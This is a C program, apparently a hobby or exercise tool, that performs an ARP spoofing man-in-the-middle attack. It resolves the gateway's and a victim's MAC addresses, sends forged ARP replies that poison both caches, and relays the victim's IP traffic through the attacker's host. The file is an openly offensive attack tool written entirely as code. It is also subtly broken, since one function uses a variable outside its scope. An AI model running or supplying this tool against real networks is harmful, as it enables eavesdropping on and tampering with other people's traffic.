#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <libnet.h> 
#include <pcap.h> 
#include <netinet/in.h> 
#include <netinet/ether.h> 
#include <unistd.h>      
#include <arpa/inet.h> 
#include <time.h>
 
void get_mine(const char *dev, struct in_addr *my_IP, struct ether_addr *my_MAC) 
{ 
    FILE* ptr; 
    char cmd[300]={0x0}; 
    char MAC[20] = {0x0};  
    char IP[20] = {0x0}; 
         
    sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'",dev);  
    ptr = popen(cmd, "r"); 
    fgets(MAC, sizeof(MAC), ptr); 
    pclose(ptr); 
 
    ether_aton_r(MAC, my_MAC);  
 
    sprintf(cmd,"ifconfig | grep -A 1 %s | tail -n 1 | awk '{print $2}' | awk -F':' '{print $2}'",dev);  
    ptr = popen(cmd, "r");  
    fgets(IP, sizeof(IP), ptr); 
    pclose(ptr); 
 
    inet_aton(IP, my_IP);  
 
    return; 
} 
 
void get_gatewayIP(const char *dev, struct in_addr *gateway_IP) 
{ 
    FILE* ptr; 
    char cmd[300] = {0x0}; 
    char IP[20] = {0x0}; 
 
    sprintf(cmd,"route -n | grep %s | grep UG | awk '{print $2}'", dev); 
    ptr = popen(cmd, "r"); 
    fgets(IP, sizeof(IP), ptr); 
    pclose(ptr); 
 
    inet_aton(IP, gateway_IP); 
 
    return; 
} 
 
 
void sendarp(pcap_t *pcd, const struct in_addr *victim_IP, struct ether_addr *victim_MAC) 
{ 
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE];     
    const u_char *packet; 
    struct pcap_pkthdr *header; 
    struct libnet_ethernet_hdr etherhdr; 
    struct ether_arp arphdr; 
    struct libnet_ethernet_hdr *ethhdr_reply; 
    struct ether_arp *arphdr_reply; 
 
    struct in_addr my_IP; 
    struct ether_addr my_MAC;     
    struct ether_addr ether_victim_MAC; 
    struct ether_addr arp_victim_MAC; 
    int i, res; 
    int check=0;    
    time_t begin,finish;
  

    const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
    const int arphdr_size = sizeof(struct ether_arp); 
    u_char buffer[etherhdr_size + arphdr_size];  
 
    dev = pcap_lookupdev(errbuf);  
    if(dev == NULL) 
    { 
        printf("%s\n",errbuf); 
        exit(1); 
    } 
     
    get_mine(dev, &my_IP, &my_MAC); 
     
    for(i=0; i<6; i++) 
    { 
        ether_victim_MAC.ether_addr_octet[i] = 0xff; 
        arp_victim_MAC.ether_addr_octet[i] = 0x0; 
    } 
 
    memcpy(etherhdr.ether_shost, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(etherhdr.ether_dhost, &ether_victim_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    etherhdr.ether_type = htons(ETHERTYPE_ARP); // reverse ntohs 
     
    arphdr.arp_hrd = htons(ARPHRD_ETHER);  
    arphdr.arp_pro = htons(ETHERTYPE_IP); // format of protocol address 
    arphdr.arp_hln = ETHER_ADDR_LEN; // length of hardware address 
    arphdr.arp_pln = sizeof(in_addr_t); // length of protocol addres 
    arphdr.arp_op  = htons(ARPOP_REQUEST); // operation type 
    memcpy(&arphdr.arp_sha, &my_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_spa, &my_IP.s_addr, sizeof(in_addr_t)); 
    memcpy(&arphdr.arp_tha, &arp_victim_MAC.ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_tpa, &(victim_IP->s_addr), sizeof(in_addr_t));  
 
    memcpy(buffer, &etherhdr, etherhdr_size ); 
    memcpy(buffer + etherhdr_size, &arphdr, arphdr_size); 
    
    while(check != 1) 
    {
    	begin=time(NULL);
        pcap_sendpacket(pcd,buffer,sizeof(buffer));
    	while(1)
	{
    		res = pcap_next_ex(pcd, &header, &packet); 
    		finish=time(NULL);
                
		if(difftime(finish,begin) > 1)
			break; 
    		if((res==0) || (res==-1)) continue; 
     
    		ethhdr_reply = (struct libnet_ethernet_hdr *) packet;
 
        	packet += sizeof(struct libnet_ethernet_hdr);       
 
    		if(ntohs(ethhdr_reply->ether_type) == ETHERTYPE_ARP) 
    		{
        		arphdr_reply = (struct ether_arp *)packet; 
        		if(arphdr_reply->arp_op == htons(ARPOP_REPLY)) 
        		{ 
            			if(!memcmp(&arphdr_reply->arp_spa, victim_IP, 4) && !memcmp(&arphdr_reply->arp_tpa, &my_IP ,4)) 
            			{     
                			memcpy(victim_MAC,&arphdr_reply->arp_sha,6); 
                			printf("get target's MAC !! \n"); 
               			        printf("target's MAC iS : %s\n\n",(char*)ether_ntoa(arphdr_reply->arp_sha)); 
					check=1;                
					break;     
            			} 
        		} 
    		}
   	} 
  } 
}  
 
 
void Infection(pcap_t *pcd, const struct in_addr *gateway_IP, const struct ether_addr *gateway_MAC, const struct ether_addr *my_MAC, const struct in_addr *victim_IP, const struct ether_addr *victim_MAC) 
{ 
    const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
    const int arphdr_size = sizeof(struct ether_arp); 
    u_char buffer1[etherhdr_size + arphdr_size];
    u_char buffer2[etherhdr_size + arphdr_size];  
    struct libnet_ethernet_hdr etherhdr; 
    struct ether_arp arphdr; 
 
    memcpy(etherhdr.ether_shost, &my_MAC->ether_addr_octet, ETHER_ADDR_LEN);  
    memcpy(etherhdr.ether_dhost, &victim_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    etherhdr.ether_type = htons(ETHERTYPE_ARP); 
     
    arphdr.arp_hrd = htons(ARPHRD_ETHER);  
    arphdr.arp_pro = htons(ETHERTYPE_IP);  
    arphdr.arp_hln = ETHER_ADDR_LEN; 
    arphdr.arp_pln = sizeof(in_addr_t);  
    arphdr.arp_op  = htons(ARPOP_REPLY);  
    memcpy(&arphdr.arp_sha, &my_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_spa, &gateway_IP->s_addr, sizeof(in_addr_t)); 
    memcpy(&arphdr.arp_tha, &victim_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_tpa, &victim_IP->s_addr, sizeof(in_addr_t)); 
 
    memcpy(buffer1, &etherhdr, etherhdr_size ); 
    memcpy(buffer1 + etherhdr_size, &arphdr, arphdr_size);
	   
    if(pcap_sendpacket(pcd,buffer1,sizeof(buffer1)) == -1) // send infection to victim.  
    { 
         pcap_perror(pcd,0); 
         pcap_close(pcd); 
         exit(1); 
    } 

    memcpy(etherhdr.ether_shost, &my_MAC->ether_addr_octet, ETHER_ADDR_LEN);  
    memcpy(etherhdr.ether_dhost, &gateway_MAC->ether_addr_octet, ETHER_ADDR_LEN);   
    
    memcpy(&arphdr.arp_spa, &victim_IP->s_addr, sizeof(in_addr_t)); 
    memcpy(&arphdr.arp_tha, &gateway_MAC->ether_addr_octet, ETHER_ADDR_LEN); 
    memcpy(&arphdr.arp_tpa, &gateway_IP->s_addr, sizeof(in_addr_t));

    memcpy(buffer2, &etherhdr, etherhdr_size ); 
    memcpy(buffer2 + etherhdr_size, &arphdr, arphdr_size); 
	   
    if(pcap_sendpacket(pcd,buffer2,sizeof(buffer2)) == -1) // send infection to gateway.  
    { 
         pcap_perror(pcd,0); 
         pcap_close(pcd); 
         exit(1); 
    }
    
    printf("Infection Victim and Gateway complete! \n\n");
    
}


void Relay(pcap_t *pcd, const struct in_addr *gateway_IP, const struct ether_addr *gateway_MAC, const struct ether_addr *my_MAC, const struct in_addr *victim_IP, const struct ether_addr *victim_MAC)
{
    const u_char *packet; 
    struct pcap_pkthdr *header; 
    struct libnet_ethernet_hdr *etherhdr; 
    struct libnet_ipv4_hdr *iphdr; 
    struct ether_arp *arphdr;    
    struct in_addr dst_IP;    

    int i, res, length;     
     
    const int etherhdr_size = sizeof(struct libnet_ethernet_hdr); 
    const int arphdr_size = sizeof(struct ether_arp); 
    const int iphdr_size = sizeof(struct libnet_ipv4_hdr);  
 
    while(1) // 1) check timeout,  2) relay ip packet from sender to receiver 
    {
	u_char buffer[1000]={0x0};
	res = pcap_next_ex(pcd, &header, &packet); 	
	length=header->len;    	
		   	
	if((res==0) || (res==-1)) continue; 
     
    	etherhdr= (struct libnet_ethernet_hdr *)packet;
	packet += sizeof(struct libnet_ethernet_hdr);
        
        if(!memcmp(&etherhdr->ether_shost, victim_MAC, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP))    
	{
        	arphdr = (struct ether_arp *)packet;
		if(arphdr->arp_op == htons(ARPOP_REQUEST)) 
        		if(!memcmp(&arphdr->arp_spa, victim_IP, 4) && !memcmp(&arphdr->arp_tpa, gateway_IP ,4)) 
            		{
				printf("Victim send ARP to Gateway! \n");
				sleep(1);				
				Infection(pcd, gateway_IP, gateway_MAC, my_MAC, victim_IP, victim_MAC);
    				continue;
	     		}
        }
	
	if(!memcmp(&etherhdr->ether_shost, gateway_MAC, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP)) 
	{
        	arphdr = (struct ether_arp *)packet;
		if(arphdr->arp_op == htons(ARPOP_REQUEST)) 
        		if(!memcmp(&arphdr->arp_spa, gateway_IP, 4) && !memcmp(&arphdr->arp_tpa, victim_IP ,4)) 
            		{	
				printf("Gateway send ARP to Victim! \n"); 
				sleep(1);					
				Infection(pcd, gateway_IP, gateway_MAC, my_MAC, victim_IP, victim_MAC);
    				continue;
	     		}
        }
       
	if(!memcmp(&etherhdr->ether_shost, victim_MAC, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_IP)) // relay
	{
		iphdr = (struct libnet_ipv4_hdr *)packet;
		if(!memcmp(&iphdr->ip_src, victim_IP, 4) && (memcmp(&iphdr->ip_dst, my_IP, 4) != 0))
		{
			printf("Catch Sender's IP_Packet to %s \n",inet_ntoa(iphdr->ip_dst)); 
			
			memcpy(buffer+etherhdr_size, packet, (length-etherhdr_size)); // first, copy (ip_hdr ~ Data section) from packet to buffer.
			memcpy(&etherhdr->ether_shost, my_MAC, 6);
			memcpy(&etherhdr->ether_dhost, gateway_MAC, 6);
			memcpy(buffer, etherhdr, etherhdr_size);
			if(pcap_sendpacket(pcd,buffer,length) == -1)  
    			{ 
         			pcap_perror(pcd,0); 
         			pcap_close(pcd); 
         			exit(1); 
    			}
			printf("Relay Sender's IP_Packet Complete! \n\n");
			continue;		
		}
	}
	
	if(!memcmp(&etherhdr->ether_shost, gateway_MAC, 6) && (ntohs(etherhdr->ether_type) == ETHERTYPE_IP)) // relay
	{
		iphdr = (struct libnet_ipv4_hdr *)packet;
		if(!memcmp(&iphdr->ip_dst, victim_IP, 4))
		{
			printf("Catch Outer world's IP_Packet to %s \n",inet_ntoa(iphdr->ip_dst)); 
			
			memcpy(buffer+etherhdr_size, packet, (length-etherhdr_size)); // first, copy (ip_hdr ~ Data section) from packet to buffer.
			memcpy(&etherhdr->ether_shost, my_MAC, 6);
			memcpy(&etherhdr->ether_dhost, victim_MAC, 6);
			memcpy(buffer, etherhdr, etherhdr_size);
			if(pcap_sendpacket(pcd,buffer,length) == -1)  
    			{ 
         			pcap_perror(pcd,0); 
         			pcap_close(pcd); 
         			exit(1); 
    			}
			printf("Relay Outer world's IP_Packet Complete! \n\n");
			continue;
		}
	}
     }
}
 
int main(int argc, char **argv) 	
{ 
    char *dev; 
    char errbuf[PCAP_ERRBUF_SIZE]; 
    pcap_t *pcd; 
 
    struct in_addr my_IP; 
    struct in_addr victim_IP;  
    struct in_addr gateway_IP; 
    struct ether_addr my_MAC; 
    struct ether_addr gateway_MAC={0x0}; 
    struct ether_addr victim_MAC={0x0};   
 
    dev = pcap_lookupdev(errbuf);  
 
    if(dev == NULL) 
    { 
        printf("%s\n",errbuf); 
        exit(1); 
    } 
     
    pcd = pcap_open_live(dev, BUFSIZ,  1/*PROMISCUOUS*/, -1, errbuf); // PROMISCUOUS means, pcd captures all packets of local network. 
 
    if (pcd == NULL) 
    { 
        printf("%s\n", errbuf); 
        exit(1); 
    } 
     
    if(inet_aton(argv[1], &victim_IP)==0) 
    { 
        printf("error : %s \n", argv[1]); 
        exit(1); 
    } 
     
    get_mine(dev, &my_IP, &my_MAC); 
    get_gatewayIP(dev, &gateway_IP); 

    printf("get gateway's MAC starts~ \n");     
    sendarp(pcd, &gateway_IP, &gateway_MAC); 
 
    printf("get victim's MAC starts~ \n"); 
    sendarp(pcd, &victim_IP, &victim_MAC); 
     
    Infection(pcd, &gateway_IP, &gateway_MAC, &my_MAC, &victim_IP, &victim_MAC);
    	
    Relay(pcd, &gateway_IP, &gateway_MAC, &my_MAC, &victim_IP, &victim_MAC);	     
    
    return 0; 
}
